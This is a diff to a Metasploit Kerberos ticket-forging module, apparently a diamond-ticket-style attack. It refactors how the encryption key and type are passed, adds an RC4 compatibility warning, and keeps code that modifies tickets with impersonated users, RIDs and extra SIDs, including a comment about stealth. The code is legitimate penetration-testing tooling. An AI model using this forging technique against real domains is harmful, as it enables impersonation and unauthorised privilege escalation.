@@ -149,7 +149,8 @@ class MetasploitModule < Msf::Auxiliary
       options = {
         stop_if_preauth_not_required: false
       }
-      include_crypto_params(options)
+      enc_key, enc_type = get_enc_key_and_type
+      include_crypto_params(options, enc_key, enc_type)
 
       res = kerberos_authenticator.request_tgt_only(options)
     rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
@@ -174,7 +175,8 @@ class MetasploitModule < Msf::Auxiliary
     options = {
       stop_if_preauth_not_required: false
     }
-    include_crypto_params(options)
+    enc_key, enc_type = get_enc_key_and_type
+    include_crypto_params(options, enc_key, enc_type)
 
     auth_context = kerberos_authenticator.authenticate_via_kdc(options)
     credential = auth_context[:credential]
@@ -186,7 +188,6 @@ class MetasploitModule < Msf::Auxiliary
       value: credential.keyblock.data.value
     )
 
-    enc_key, enc_type = get_enc_key_and_type
     tgs_ticket, tgs_auth = kerberos_authenticator.u2uself(credential, impersonate: datastore['USER'])
     ticket = modify_ticket(tgs_ticket, tgs_auth, datastore['USER'], datastore['USER_RID'], datastore['DOMAIN'], extra_sids, session_key.value, enc_type, enc_key, true)
     ticket = Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ticket, framework_module: self, host: datastore['RHOST'])
@@ -211,9 +212,8 @@ class MetasploitModule < Msf::Auxiliary
     Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::Base.new(**options)
   end
 
-  def include_crypto_params(options)
-    key, enc_type = get_enc_key_and_type
-    options[:key] = key
+  def include_crypto_params(options, enc_key, enc_type)
+    options[:key] = enc_key
     if enc_type == Rex::Proto::Kerberos::Crypto::Encryption::AES256
       # This should be the server's preferred encryption type, so we can just
       # send our default types, expecting that to be selected. More stealthy this way.
@@ -229,6 +229,7 @@ class MetasploitModule < Msf::Auxiliary
     if datastore['NTHASH']
       enc_type = Rex::Proto::Kerberos::Crypto::Encryption::RC4_HMAC
       key = datastore['NTHASH']
+      print_warning('Warning: newer Windows systems may not accept tickets encrypted with RC4_HMAC (NT hash). Consider using AES.')
     elsif datastore['AES_KEY']
       key = datastore['AES_KEY']
       if datastore['AES_KEY'].size == 64
